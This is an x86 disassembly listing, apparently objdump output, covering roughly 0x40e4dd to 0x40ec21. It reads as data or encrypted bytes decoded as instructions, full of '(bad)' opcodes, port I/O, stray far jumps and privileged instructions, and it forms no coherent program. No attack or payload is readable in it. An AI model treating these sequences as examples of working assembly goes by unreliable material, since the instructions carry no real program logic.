  40e4dd:	je     0x40e559
  40e4df:	lock pusha 
  40e4e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4e2:	pop    esp
  40e4e3:	and    DWORD PTR [edi-0x41fd226b],esi
  40e4e9:	loope  0x40e4ee
  40e4eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e4ed:	mov    eax,0xe50acc21
  40e4f2:	xchg   BYTE PTR [eax-0x5a],dh
  40e4f5:	pop    eax
  40e4f6:	jae    0x40e4fd
  40e4f8:	in     eax,0x13
  40e4fa:	sbb    DWORD PTR [ebx],esp
  40e4fc:	nop
  40e4fd:	cmp    ecx,DWORD PTR [ecx-0x5e1dc207]
  40e503:	loopne 0x40e557
  40e505:	and    eax,0xdbe9e9fb
  40e50a:	in     al,0xb
  40e50c:	and    esp,DWORD PTR [edi+0x58d2538b]
  40e512:	retf   
  40e513:	mov    cl,dh
  40e515:	gs push edi
  40e517:	lea    ebx,ds:[eax+edi*2]
  40e51b:	mov    bh,0xd6
  40e51d:	inc    edi
  40e51e:	fdiv   DWORD PTR [esi]
  40e520:	cmp    bh,BYTE PTR [ebx+edi*2-0x3a1c432e]
  40e527:	repnz dec edi
  40e529:	pop    edx
  40e52a:	adc    eax,DWORD PTR [edi+ebp*8-0x3d5f06f2]
  40e531:	pop    esi
  40e532:	call   0xccf8c7af
  40e537:	aad    0x79
  40e539:	ret    
  40e53a:	mov    ebp,0x23a96a1
  40e53f:	fbld   TBYTE PTR [ecx]
  40e541:	cld    
  40e542:	pop    esp
  40e543:	fsubr  QWORD PTR [ebp-0x60c9d9c9]
  40e549:	jmp    0x13b6:0x50da9eb6
  40e550:	pop    ebp
  40e551:	call   0xc86a:0x8285dff9
  40e558:	shl    BYTE PTR [eax],1
  40e55a:	pop    eax
  40e55b:	out    dx,eax
  40e55c:	fwait
  40e55d:	jb     0x40e536
  40e55f:	jle    0x40e550
  40e561:	jmp    0x40e5b8
  40e563:	or     dl,cl
  40e565:	loop   0x40e4ef
  40e567:	popf   
  40e568:	push   0xffffffd4
  40e56a:	xor    eax,0x2acc9d96
  40e56f:	sub    DWORD PTR [edx],esp
  40e571:	adc    eax,0xbb5b9a31
  40e576:	mov    esi,0xa48b895e
  40e57b:	(bad)  
  40e57c:	sub    eax,0x170653c1
  40e581:	xlat   BYTE PTR ds:[ebx]
  40e582:	add    al,0x4e
  40e584:	mov    ah,0xe6
  40e586:	sbb    ecx,DWORD PTR [edi-0x72af0a1a]
  40e58c:	jns    0x40e5d5
  40e58e:	adc    DWORD PTR [edi+0x3a],ebp
  40e591:	gs fwait
  40e593:	ins    DWORD PTR es:[edi],dx
  40e594:	loop   0x40e608
  40e596:	sub    al,0x74
  40e598:	daa    
  40e599:	(bad)  
  40e59a:	jmp    0x40e51d
  40e59c:	jb     0x40e5d5
  40e59e:	aas    
  40e59f:	daa    
  40e5a0:	sbb    al,0x36
  40e5a2:	xlat   BYTE PTR ds:[ebx]
  40e5a3:	add    bl,BYTE PTR [esi+eax*8+0x2c]
  40e5a7:	dec    edx
  40e5a8:	push   es
  40e5a9:	mov    cl,0x12
  40e5ab:	bound  ebx,QWORD PTR [eax+0x26eadc35]
  40e5b1:	sub    eax,0x3e592aa6
  40e5b6:	mov    ecx,0xf604794e
  40e5bb:	test   eax,0xf6897373
  40e5c0:	lods   al,BYTE PTR ds:[esi]
  40e5c1:	xorps  xmm0,XMMWORD PTR [edx+ecx*8]
  40e5c5:	dec    esi
  40e5c6:	sbb    BYTE PTR [esi],dl
  40e5c8:	push   cs
  40e5c9:	sbb    eax,0xd4869195
  40e5ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5cf:	mov    ebp,esp
  40e5d1:	or     edi,ebp
  40e5d3:	cdq    
  40e5d4:	test   BYTE PTR [edx+eax*4+0x1e03414c],cl
  40e5db:	pop    edi
  40e5dc:	stc    
  40e5dd:	(bad)  
  40e5de:	test   DWORD PTR [eax+edx*2+0x66570ebc],esp
  40e5e5:	pop    ebx
  40e5e6:	mov    BYTE PTR [ebx],dl
  40e5e8:	adc    ebp,DWORD PTR [esi-0x10]
  40e5eb:	test   eax,0x25b758c3
  40e5f0:	js     0x40e591
  40e5f2:	add    DWORD PTR [esi+0x58bfc6f3],edx
  40e5f8:	jo     0x40e61a
  40e5fa:	lds    eax,FWORD PTR [ebx]
  40e5fc:	push   ebx
  40e5fd:	pop    esp
  40e5fe:	hlt    
  40e5ff:	cmp    DWORD PTR [edx-0x3ef6a93d],ecx
  40e605:	adc    eax,edi
  40e607:	sub    esp,DWORD PTR [eax+0x13]
  40e60a:	(bad)  
  40e60b:	sub    eax,0x8d8ef18f
  40e610:	adc    eax,0x6a374f53
  40e615:	popa   
  40e616:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e617:	dec    ecx
  40e618:	sub    DWORD PTR [eax+0x373abc45],eax
  40e61e:	loopne 0x40e5d3
  40e620:	sbb    ebp,edx
  40e622:	push   ebx
  40e623:	in     eax,dx
  40e624:	(bad)  
  40e625:	and    DWORD PTR [esi+0x6],edi
  40e628:	add    al,0x23
  40e62a:	std    
  40e62b:	dec    ecx
  40e62c:	shr    DWORD PTR [esi],0x37
  40e62f:	dec    ecx
  40e630:	retf   0x6e1e
  40e633:	add    ah,cl
  40e635:	cmp    eax,0x7ce8bc78
  40e63a:	test   al,0x2b
  40e63c:	pop    esi
  40e63d:	dec    eax
  40e63e:	mov    dh,0x81
  40e640:	cmc    
  40e641:	and    eax,0x4c93a3e2
  40e646:	xor    ch,BYTE PTR [edx]
  40e648:	push   ecx
  40e649:	lahf   
  40e64a:	(bad)  
  40e64c:	pop    es
  40e64d:	push   0x51
  40e64f:	stc    
  40e650:	xchg   esp,eax
  40e651:	pop    esi
  40e652:	inc    esi
  40e653:	inc    eax
  40e654:	mov    al,0x4d
  40e656:	sbb    eax,0x531b86b1
  40e65b:	sbb    al,0x81
  40e65d:	cmp    dh,dh
  40e65f:	aas    
  40e660:	push   esi
  40e661:	xlat   BYTE PTR ds:[ebx]
  40e662:	sbb    BYTE PTR [esi-0x42],ah
  40e665:	in     eax,0x5e
  40e667:	in     eax,0x88
  40e669:	xchg   ebp,eax
  40e66a:	mov    ecx,0xb4adc1ea
  40e66f:	push   cs
  40e670:	add    al,0xac
  40e672:	xchg   esp,eax
  40e673:	test   eax,0xa6b971ef
  40e678:	arpl   bx,sp
  40e67a:	inc    edx
  40e67b:	dec    ebx
  40e67c:	nop
  40e67d:	add    ecx,DWORD PTR [esi+0x29ea5ac3]
  40e683:	data16 sbb BYTE PTR [ebp+ecx*2-0x58],0xfb
  40e689:	xchg   esi,eax
  40e68a:	iret   
  40e68b:	cmp    al,cl
  40e68d:	push   esp
  40e68e:	repnz mov sp,0xf00a
  40e694:	stc    
  40e695:	fxch   st(5)
  40e697:	in     al,dx
  40e698:	mov    edx,0xae67d8d2
  40e69d:	call   0xf23d:0x97c0ad3e
  40e6a4:	or     al,0xc8
  40e6a6:	pop    ss
  40e6a7:	or     al,0x3f
  40e6a9:	cdq    
  40e6aa:	or     DWORD PTR [ebp-0x13595b5c],ebp
  40e6b0:	xor    BYTE PTR [esp+ebx*2],al
  40e6b3:	sbb    eax,0x3f0e5a6c
  40e6b8:	xor    BYTE PTR [edx+edi*8-0x72],cl
  40e6bc:	aas    
  40e6bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6be:	fldenv [esi+eax*1-0xb]
  40e6c2:	jecxz  0x40e675
  40e6c4:	pop    ecx
  40e6c5:	inc    ecx
  40e6c6:	ss pop edi
  40e6c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6c9:	jge    0x40e746
  40e6cb:	out    0x15,al
  40e6cd:	xchg   esp,eax
  40e6ce:	fnstcw WORD PTR [eax]
  40e6d0:	aas    
  40e6d1:	dec    DWORD PTR [eax]
  40e6d3:	out    dx,eax
  40e6d4:	aam    0x50
  40e6d6:	sbb    dh,BYTE PTR [ebx-0x29]
  40e6d9:	mov    ebx,0x517ec83a
  40e6de:	pusha  
  40e6df:	cmp    BYTE PTR [esi+0xdff0e0f],ah
  40e6e5:	sub    BYTE PTR [ebx-0x12aaf6e0],ah
  40e6eb:	add    BYTE PTR [edi],bl
  40e6ed:	icebp  
  40e6ee:	(bad)  
  40e6ef:	fcom   st(5)
  40e6f1:	adc    BYTE PTR [ebp+0x7b7935eb],0x78
  40e6f8:	mov    dl,0xe5
  40e6fa:	xor    ebp,DWORD PTR [ebx]
  40e6fc:	pop    ds
  40e6fd:	sbb    eax,0x87585ec9
  40e702:	daa    
  40e703:	mov    ch,0xcd
  40e705:	jbe    0x40e76a
  40e707:	cli    
  40e708:	inc    esi
  40e709:	lock xchg edx,eax
  40e70b:	pop    ebp
  40e70c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e70d:	repnz push ds
  40e70f:	fidivr DWORD PTR [ecx]
  40e711:	aad    0x64
  40e713:	(bad)  
  40e714:	mov    ecx,0x3ef554f1
  40e719:	mov    cl,0x97
  40e71b:	jns    0x40e78b
  40e71d:	pusha  
  40e71e:	popf   
  40e71f:	inc    edi
  40e720:	sbb    al,ch
  40e722:	dec    ebx
  40e723:	adc    DWORD PTR [ebx+0x11433406],ebx
  40e729:	stos   DWORD PTR es:[edi],eax
  40e72a:	mov    bl,BYTE PTR [esi+0x10]
  40e72d:	jo     0x40e6bf
  40e72f:	fs loopne 0x40e7a5
  40e732:	mov    BYTE PTR [ecx],al
  40e734:	in     eax,dx
  40e735:	jmp    0xbcb4:0x79966459
  40e73c:	sub    DWORD PTR [eax+0x13],ebp
  40e73f:	sub    al,0xd6
  40e741:	push   0xffffffba
  40e743:	test   al,0xa8
  40e745:	push   ss
  40e746:	and    al,0xa9
  40e748:	and    BYTE PTR [ebx+0x704fd684],dh
  40e74e:	data16 fcomp DWORD PTR [ecx+0x6a0262e9]
  40e755:	push   ebp
  40e756:	sbb    edx,DWORD PTR [eax]
  40e758:	rcl    DWORD PTR [edi+eiz*8],1
  40e75b:	xlat   BYTE PTR ss:[ebx]
  40e75d:	mov    bh,bl
  40e75f:	call   0x182dc228
  40e764:	sti    
  40e765:	jno    0x40e78b
  40e767:	lods   al,BYTE PTR ds:[esi]
  40e768:	shr    DWORD PTR [esi-0x62],0xa3
  40e76c:	pushf  
  40e76d:	cmp    eax,0x4b3e879f
  40e772:	xchg   ebx,eax
  40e773:	fistp  WORD PTR [edi+ebx*2-0x37cec4d2]
  40e77a:	out    dx,eax
  40e77b:	cs xor eax,0x87d0f374
  40e781:	rcl    ebx,0x7a
  40e784:	push   edi
  40e785:	pop    es
  40e786:	nop
  40e787:	addr16 pushf 
  40e789:	pandn  mm4,QWORD PTR [eax-0x1af4a53b]
  40e790:	cwde   
  40e791:	pop    ss
  40e792:	in     eax,0xd
  40e794:	popa   
  40e795:	xchg   ebx,eax
  40e796:	ja     0x40e812
  40e798:	int3   
  40e799:	es leave 
  40e79b:	cmp    eax,0x1efdee6
  40e7a0:	sahf   
  40e7a1:	mov    eax,0x88fb4035
  40e7a6:	xlat   BYTE PTR ds:[ebx]
  40e7a7:	dec    eax
  40e7a8:	stos   BYTE PTR es:[edi],al
  40e7a9:	repz ret 0xf06c
  40e7ad:	fist   WORD PTR [ebx-0x520bcab2]
  40e7b3:	jl     0x40e7d9
  40e7b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7b6:	stos   BYTE PTR es:[edi],al
  40e7b7:	push   0xffffffe7
  40e7b9:	daa    
  40e7ba:	mov    cl,0xa1
  40e7bc:	(bad)  
  40e7bd:	ss xchg esp,ebx
  40e7c0:	mov    es,WORD PTR ds:[ecx+0x14]
  40e7c4:	push   es
  40e7c5:	adc    eax,0xcb295cb6
  40e7ca:	dec    edx
  40e7cb:	adc    cl,ah
  40e7cd:	js     0x40e755
  40e7cf:	ffree  st(3)
  40e7d1:	ja     0x40e83f
  40e7d3:	ret    
  40e7d4:	push   edi
  40e7d5:	jmp    DWORD PTR [edi]
  40e7d7:	add    ebx,esi
  40e7d9:	dec    ebp
  40e7da:	adc    edi,DWORD PTR [ecx+0x60854ca1]
  40e7e0:	xor    ch,BYTE PTR [ebp-0x5a]
  40e7e3:	ja     0x40e7ac
  40e7e5:	or     BYTE PTR fs:[eax-0x4c],ah
  40e7e9:	inc    esi
  40e7ea:	xor    edx,eax
  40e7ec:	stos   DWORD PTR es:[edi],eax
  40e7ed:	sti    
  40e7ee:	imul   ecx,DWORD PTR [esi],0xa04e3c54
  40e7f4:	or     BYTE PTR [ebx-0x29c17b14],0x0
  40e7fb:	mov    ah,0xe8
  40e7fd:	outs   dx,DWORD PTR ds:[esi]
  40e7fe:	dec    edx
  40e7ff:	mov    ecx,0xaa164681
  40e804:	sti    
  40e805:	add    DWORD PTR [eax-0x6b1edd1d],esi
  40e80b:	inc    edi
  40e80c:	push   ds
  40e80d:	adc    dh,dh
  40e80f:	aam    0x8c
  40e811:	inc    eax
  40e812:	jne    0x40e7b5
  40e814:	sbb    eax,0x7cee4b89
  40e819:	popa   
  40e81a:	jno    0x40e869
  40e81c:	lock inc ebp
  40e81e:	sbb    eax,0x6a856d1d
  40e823:	and    eax,0x5b8e6178
  40e828:	sbb    al,0xca
  40e82a:	call   0xff9f907
  40e82f:	cwde   
  40e830:	xchg   cl,dl
  40e832:	cmp    DWORD PTR [ecx+eiz*2-0x1085623b],edi
  40e839:	ja     0x40e8b7
  40e83b:	ret    
  40e83c:	pop    ebx
  40e83d:	sahf   
  40e83e:	adc    eax,0x4e26594d
  40e843:	xchg   dl,al
  40e845:	shl    bh,0x44
  40e848:	push   ebx
  40e849:	push   cs
  40e84a:	mov    edi,0xfa7aaad9
  40e84f:	into   
  40e850:	test   BYTE PTR [eax+esi*1-0x325f0eeb],bh
  40e857:	inc    esp
  40e858:	mov    ebx,?
  40e85a:	jge    0x40e8d2
  40e85c:	into   
  40e85d:	adc    esp,DWORD PTR ds:0x1ea08c06
  40e863:	add    bl,BYTE PTR [ecx-0x4ae9b86b]
  40e869:	or     al,0x42
  40e86b:	out    dx,eax
  40e86c:	in     al,0x41
  40e86e:	sti    
  40e86f:	push   ebx
  40e870:	pusha  
  40e871:	sahf   
  40e872:	lahf   
  40e873:	(bad)  
  40e874:	lock add eax,0x566666b2
  40e87a:	dec    ebp
  40e87b:	xor    ch,0x7f
  40e87e:	pop    esi
  40e87f:	(bad)  [esp+edi*8+0x7f9555f9]
  40e886:	jmp    0x40e8c0
  40e888:	jnp    0x40e840
  40e88a:	jmpw   0x881f
  40e88e:	repnz in al,0xec
  40e891:	popf   
  40e892:	loopne 0x40e87a
  40e894:	lods   eax,DWORD PTR ds:[esi]
  40e895:	dec    eax
  40e896:	(bad)  
  40e897:	shl    bh,cl
  40e899:	out    0xb2,eax
  40e89b:	dec    ebx
  40e89c:	daa    
  40e89d:	lock adc BYTE PTR [ecx+0x7c],ch
  40e8a1:	lods   eax,DWORD PTR ds:[esi]
  40e8a2:	xchg   edx,eax
  40e8a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8a4:	imul   eax,DWORD PTR [ebx-0x50],0xa35ab109
  40e8ab:	loopne 0x40e8a3
  40e8ad:	je     0x40e83f
  40e8af:	into   
  40e8b0:	cdq    
  40e8b1:	mov    ch,cl
  40e8b3:	sbb    al,0xc3
  40e8b5:	(bad)
  40e8b9:	aam    0xf0
  40e8bb:	add    eax,0xf4130f34
  40e8c0:	ins    BYTE PTR es:[edi],dx
  40e8c1:	aaa    
  40e8c2:	rcr    BYTE PTR [eax],1
  40e8c4:	adc    al,0x3c
  40e8c6:	mov    cl,0xe9
  40e8c8:	inc    ebx
  40e8c9:	or     eax,0xf98e4122
  40e8ce:	jne    0x40e8fd
  40e8d0:	xor    bh,BYTE PTR [ebx-0x5810709d]
  40e8d6:	das    
  40e8d7:	sub    eax,0xe4ef7618
  40e8dc:	adc    ch,BYTE PTR [edi+0x34a30262]
  40e8e2:	mov    BYTE PTR [ebp-0x24],0x39
  40e8e6:	stos   DWORD PTR es:[edi],eax
  40e8e7:	mov    DWORD PTR [edi+0x70fd38fe],ebp
  40e8ed:	fisttp WORD PTR [ecx+0x28029329]
  40e8f3:	adc    BYTE PTR [edi],0xd3
  40e8f6:	adc    DWORD PTR [eax],eax
  40e8f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e8f9:	mov    ah,0xfd
  40e8fb:	mov    al,ds:0xc6b53b7a
  40e900:	or     BYTE PTR [ebx-0x4e1db2c4],ah
  40e906:	js     0x40e8a9
  40e908:	rcr    DWORD PTR [ebx],1
  40e90a:	mov    eax,0x9c0ba99e
  40e90f:	pushf  
  40e910:	xchg   ecx,ecx
  40e912:	jno    0x40e902
  40e914:	or     BYTE PTR ds:0x5443537,ch
  40e91a:	push   ecx
  40e91b:	dec    eax
  40e91c:	es shl ecx,cl
  40e91f:	and    DWORD PTR [eax+0x6c],eax
  40e922:	rcr    DWORD PTR [esi],1
  40e924:	fs xchg edi,eax
  40e926:	stos   BYTE PTR es:[edi],al
  40e927:	mov    ?,WORD PTR [edi+0x7a6ba2d2]
  40e92d:	(bad)  
  40e92e:	loop   0x40e913
  40e930:	mov    edx,0x36f573fe
  40e935:	dec    ebp
  40e936:	inc    ebp
  40e937:	push   ds
  40e938:	mov    dl,0x56
  40e93a:	hlt    
  40e93b:	xor    dl,BYTE PTR [ebp+esi*8-0x67]
  40e93f:	lea    edi,[esp+edi*2]
  40e942:	out    dx,eax
  40e943:	lahf   
  40e944:	pop    eax
  40e945:	sti    
  40e946:	jno    0x40e995
  40e948:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e949:	lods   eax,DWORD PTR ds:[esi]
  40e94a:	js     0x40e994
  40e94c:	dec    esp
  40e94d:	sub    eax,0x948a4163
  40e952:	test   edx,ecx
  40e954:	or     al,0x1e
  40e956:	xchg   edx,eax
  40e957:	cdq    
  40e958:	pop    es
  40e959:	mov    dl,0x79
  40e95b:	mov    dl,0x6e
  40e95d:	mov    bh,0xc
  40e95f:	test   eax,0x2c619b79
  40e964:	sti    
  40e965:	push   ecx
  40e966:	aam    0xf2
  40e968:	adc    al,ch
  40e96a:	pop    esi
  40e96b:	je     0x40e9d7
  40e96d:	push   edx
  40e96e:	sbb    eax,0x5b6541a2
  40e973:	xchg   ecx,eax
  40e974:	in     al,dx
  40e975:	xor    DWORD PTR [edx],0x2e66f552
  40e97b:	mov    ebp,0xf83d3931
  40e980:	jne    0x40e91d
  40e982:	cmp    BYTE PTR [ebx-0x4eab157d],al
  40e988:	push   edi
  40e989:	xor    BYTE PTR [ecx],0x91
  40e98c:	sti    
  40e98d:	sub    DWORD PTR [edi+0x13fdfe61],ecx
  40e993:	or     DWORD PTR [ecx],ebx
  40e995:	jb     0x40e9ec
  40e997:	retf   
  40e998:	(bad)  
  40e999:	shl    DWORD PTR [eax],0x6b
  40e99c:	push   ds
  40e99d:	sbb    eax,0x3ed876d1
  40e9a2:	jae    0x40ea06
  40e9a4:	sbb    DWORD PTR [edx],ecx
  40e9a6:	jle    0x40ea0b
  40e9a8:	es push edi
  40e9aa:	jbe    0x40ea0c
  40e9ac:	les    esi,FWORD PTR [eax-0x2]
  40e9af:	and    esi,DWORD PTR [eax+esi*1+0x44c8abdb]
  40e9b6:	xchg   ebx,eax
  40e9b7:	(bad)  
  40e9b8:	addr16 xchg esp,eax
  40e9ba:	and    DWORD PTR [esi],eax
  40e9bc:	push   ecx
  40e9bd:	jl     0x40e968
  40e9bf:	ds xchg ebp,eax
  40e9c1:	jg     0x40e9ff
  40e9c3:	add    al,0xf8
  40e9c5:	out    0xd1,al
  40e9c7:	inc    edx
  40e9c8:	inc    esi
  40e9c9:	mov    ebx,0x244a6708
  40e9ce:	nop
  40e9cf:	xchg   esp,eax
  40e9d0:	shl    BYTE PTR [edi],cl
  40e9d2:	aas    
  40e9d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9d4:	pop    ecx
  40e9d5:	dec    ebx
  40e9d6:	dec    esi
  40e9d7:	hlt    
  40e9d8:	xor    dh,bl
  40e9da:	sub    al,0xe5
  40e9dc:	loop   0x40ea54
  40e9de:	lock pop ecx
  40e9e0:	fcmovnb st,st(4)
  40e9e2:	shl    edi,0x57
  40e9e5:	pop    ecx
  40e9e6:	xchg   DWORD PTR [eax+0x13],esp
  40e9e9:	push   edi
  40e9ea:	fnstcw WORD PTR [esi-0x2a3e4d46]
  40e9f0:	scas   al,BYTE PTR es:[edi]
  40e9f1:	stos   BYTE PTR es:[edi],al
  40e9f2:	pop    edx
  40e9f3:	push   ecx
  40e9f4:	mov    edx,DWORD PTR [esi]
  40e9f6:	sbb    bh,BYTE PTR [ebp+0x69]
  40e9f9:	xchg   ebx,eax
  40e9fa:	pop    esp
  40e9fb:	mov    ah,0x20
  40e9fd:	mov    bh,0x2f
  40e9ff:	cwde   
  40ea00:	xor    BYTE PTR [ecx-0x2c],dl
  40ea03:	scas   eax,DWORD PTR es:[edi]
  40ea04:	ja     0x40e9f8
  40ea06:	sbb    bh,BYTE PTR [ebp-0x3e]
  40ea09:	push   edi
  40ea0a:	mov    WORD PTR [ecx],?
  40ea0c:	(bad)
  40ea0f:	jge    0x40ea2d
  40ea11:	imul   ebx,DWORD PTR [eax+0x9],0xd4d3580
  40ea18:	push   0x71
  40ea1a:	scas   al,BYTE PTR es:[edi]
  40ea1b:	fisub  DWORD PTR [edi*1-0x179ad12]
  40ea22:	xchg   ebp,eax
  40ea23:	jecxz  0x40ea2d
  40ea25:	es pop esp
  40ea27:	packuswb mm1,QWORD PTR [ebp+0x46]
  40ea2b:	mov    cl,ch
  40ea2d:	fisttp DWORD PTR [edi-0x37aeca9a]
  40ea33:	sbb    al,0x61
  40ea35:	push   ebx
  40ea36:	mov    ebx,0x9694c28d
  40ea3b:	ret    0x132e
  40ea3e:	mov    ds:0xc67a0a38,al
  40ea43:	pusha  
  40ea44:	xor    eax,0x94541b69
  40ea49:	stos   DWORD PTR es:[edi],eax
  40ea4a:	cs iret 
  40ea4c:	fnsave [edx+edx*2-0x32370bc4]
  40ea53:	push   ss
  40ea54:	sub    ah,BYTE PTR fs:[edi+0x5b]
  40ea58:	xchg   edi,eax
  40ea59:	mov    WORD PTR [ebx],?
  40ea5b:	test   BYTE PTR [eax+0x5833f3de],bh
  40ea61:	and    edx,DWORD PTR [eax]
  40ea63:	mov    ebp,0x83909436
  40ea68:	leave  
  40ea69:	ja     0x40eae3
  40ea6b:	in     al,dx
  40ea6c:	pop    ecx
  40ea6d:	mov    ebp,0xe149665f
  40ea72:	mov    ecx,esi
  40ea74:	stos   BYTE PTR es:[edi],al
  40ea75:	jo     0x40eab0
  40ea77:	push   ebp
  40ea78:	add    ah,al
  40ea7a:	ret    
  40ea7b:	ret    0xa5e
  40ea7e:	pop    es
  40ea7f:	ficomp DWORD PTR [ecx]
  40ea81:	mov    ebx,0xd4bdcaed
  40ea86:	xchg   DWORD PTR [eax-0x5e78b98d],esi
  40ea8c:	and    DWORD PTR [edi],edx
  40ea8e:	sub    BYTE PTR [eax+0x177bec12],bl
  40ea94:	iret   
  40ea95:	leave  
  40ea96:	mov    eax,ds:0xa9419615
  40ea9b:	jg     0x40ea7c
  40ea9d:	mov    DWORD PTR gs:[esi-0x3f],0xf5824c76
  40eaa5:	jmp    0xf757cd70
  40eaaa:	inc    esi
  40eaab:	inc    esp
  40eaac:	nop
  40eaad:	cld    
  40eaae:	sahf   
  40eaaf:	ror    BYTE PTR [esi+edi*2-0x7aa41f62],0xfd
  40eab7:	repz fs js 0x40ea71
  40eabb:	cmp    al,0x99
  40eabd:	pop    ss
  40eabe:	int    0x5e
  40eac0:	add    ebp,DWORD PTR [eax+0x170c4b08]
  40eac6:	pop    edx
  40eac7:	inc    edi
  40eac8:	stos   BYTE PTR es:[edi],al
  40eac9:	icebp  
  40eaca:	xchg   esi,eax
  40eacb:	leave  
  40eacc:	and    eax,0x949d3581
  40ead1:	mov    BYTE PTR [edx+0x58f83f5c],dl
  40ead7:	fistp  DWORD PTR ds:0x152f4c13
  40eadd:	push   edx
  40eade:	inc    ebp
  40eadf:	test   eax,0x31c5c731
  40eae4:	push   0xa1b4ff9b
  40eae9:	inc    ecx
  40eaea:	retf   
  40eaeb:	repz pushf 
  40eaed:	pop    edx
  40eaee:	inc    esp
  40eaef:	into   
  40eaf0:	inc    ebp
  40eaf1:	mov    ah,0xfa
  40eaf3:	mov    eax,ds:0x845975a4
  40eaf8:	pop    edx
  40eaf9:	cmp    DWORD PTR [eax+edx*1-0x4d],eax
  40eafd:	enter  0xa2c0,0xc
  40eb01:	out    dx,eax
  40eb02:	xor    DWORD PTR [ecx+0x3c],0x67
  40eb06:	imul   esp,DWORD PTR [eax-0x3f6fea7b],0x47
  40eb0d:	and    DWORD PTR [ecx-0x3d0036bf],ebp
  40eb13:	in     eax,0xcc
  40eb15:	or     dh,dh
  40eb17:	adc    esi,DWORD PTR [edi+0xe]
  40eb1a:	cmc    
  40eb1b:	pusha  
  40eb1c:	mov    ebp,DWORD PTR [eax]
  40eb1e:	sub    ebx,DWORD PTR [ecx]
  40eb20:	xor    dl,BYTE PTR [edx+0x3f]
  40eb23:	fwait
  40eb24:	fs adc al,0xbd
  40eb27:	dec    ecx
  40eb28:	or     esp,DWORD PTR [edx]
  40eb2a:	scas   al,BYTE PTR es:[edi]
  40eb2b:	pop    esp
  40eb2c:	inc    eax
  40eb2d:	cli    
  40eb2e:	fnstsw ax
  40eb30:	lahf   
  40eb31:	leave  
  40eb32:	arpl   WORD PTR [ebx-0x64],di
  40eb35:	enter  0x7f1d,0x30
  40eb39:	pop    ds
  40eb3a:	jae    0x40eb21
  40eb3c:	mov    cl,0xde
  40eb3e:	adc    DWORD PTR [edx],edx
  40eb40:	je     0x40eae6
  40eb42:	mov    bh,0xc7
  40eb44:	fwait
  40eb45:	loopne 0x40eb2a
  40eb47:	jns    0x40eb6a
  40eb49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb4a:	inc    eax
  40eb4b:	(bad)  
  40eb4c:	popa   
  40eb4d:	inc    esi
  40eb4e:	repnz imul ebp,DWORD PTR [edi-0x65f1e8aa],0x5
  40eb56:	mov    ecx,0xa9405a2b
  40eb5b:	aaa    
  40eb5c:	inc    esi
  40eb5d:	mov    esp,0xb808b793
  40eb62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb63:	stc    
  40eb64:	xchg   BYTE PTR [esi],bh
  40eb66:	in     al,0x8a
  40eb68:	xor    bl,BYTE PTR [edx-0x3f]
  40eb6b:	test   DWORD PTR [esi+0x7a],ecx
  40eb6e:	rcr    DWORD PTR [ebx+0x33],0x12
  40eb72:	cmp    dh,0xe5
  40eb75:	inc    ebp
  40eb76:	mov    BYTE PTR [ebp+edx*2-0x47],bl
  40eb7a:	test   eax,0x56d96d68
  40eb7f:	ficomp WORD PTR [edx]
  40eb81:	dec    edi
  40eb82:	popf   
  40eb83:	xchg   ebx,eax
  40eb84:	xor    eax,0xad39a020
  40eb89:	push   edx
  40eb8a:	jp     0x40eb61
  40eb8c:	shl    DWORD PTR [ecx-0x26],0x43
  40eb90:	mov    eax,0xb6659c6d
  40eb95:	int3   
  40eb96:	retf   
  40eb97:	test   DWORD PTR [ebp+0x10],0x807602b5
  40eb9e:	(bad)  
  40eb9f:	pop    ebp
  40eba0:	push   0xe5d20971
  40eba5:	mov    ebp,0xcc1490b4
  40ebaa:	jmp    0xa3cc4c0
  40ebaf:	push   edi
  40ebb0:	retf   
  40ebb1:	pusha  
  40ebb2:	jne    0x40eba7
  40ebb4:	jne    0x40ebaa
  40ebb6:	xor    eax,0x421ca4f8
  40ebbb:	aad    0x86
  40ebbd:	les    eax,FWORD PTR [esi-0x2f8db904]
  40ebc3:	cmp    edx,ebx
  40ebc5:	test   BYTE PTR [ecx+0x540b55a3],dl
  40ebcb:	out    dx,eax
  40ebcc:	mov    ch,0x96
  40ebce:	sahf   
  40ebcf:	xchg   cl,ah
  40ebd1:	stos   DWORD PTR es:[edi],eax
  40ebd2:	lds    ebp,FWORD PTR [edi]
  40ebd4:	dec    edi
  40ebd5:	hlt    
  40ebd6:	xchg   ebp,eax
  40ebd7:	xchg   DWORD PTR [ecx],edi
  40ebd9:	cmp    ebx,DWORD PTR [ecx+0x377205f8]
  40ebdf:	sbb    ch,dh
  40ebe1:	mov    DWORD PTR [ebx-0x12],ebp
  40ebe4:	mov    al,ds:0xf6396f33
  40ebe9:	jg     0x40ec3d
  40ebeb:	pop    edi
  40ebec:	push   esi
  40ebed:	gs cmc 
  40ebef:	jae    0x40ebc5
  40ebf1:	ret    0x6fab
  40ebf4:	mov    eax,ds:0xc6dff2af
  40ebf9:	add    DWORD PTR [esp+eiz*2+0x40],ebp
  40ebfd:	inc    esi
  40ebfe:	fld    TBYTE PTR [ebx+0x6f]
  40ec01:	out    dx,eax
  40ec02:	enter  0xb8bd,0xce
  40ec06:	or     ah,dl
  40ec08:	out    dx,al
  40ec09:	pop    edi
  40ec0a:	lds    ebp,FWORD PTR [edi-0x265e6cf0]
  40ec10:	aas    
  40ec11:	outs   dx,DWORD PTR ds:[esi]
  40ec13:	jl     0x40ec7a
  40ec15:	popf   
  40ec16:	lds    ebx,FWORD PTR [edi]
  40ec18:	xor    eax,DWORD PTR [ecx]
  40ec1a:	shl    BYTE PTR [eax],cl
  40ec1c:	push   ebp
  40ec1d:	ja     0x40ec76
  40ec1f:	jns    0x40ebcd
  40ec21:	outs   dx,DWORD PTR ds:[esi]
